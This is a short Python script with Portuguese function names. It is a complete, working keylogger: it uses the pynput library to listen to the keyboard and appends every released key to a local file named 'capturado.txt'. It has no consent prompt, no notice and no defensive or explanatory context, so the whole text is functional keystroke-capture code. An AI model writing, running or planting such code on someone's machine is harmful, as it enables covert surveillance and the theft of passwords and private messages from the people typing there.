from pynput.keyboard import Key, Listener

def pressionado(Key):
    pass

def soltado(Key):
    with open('capturado.txt', 'a') as file:
        file.write(str(f'{Key}'))

with Listener(on_press=pressionado, on_release=soltado) as listener:
    listener.join()
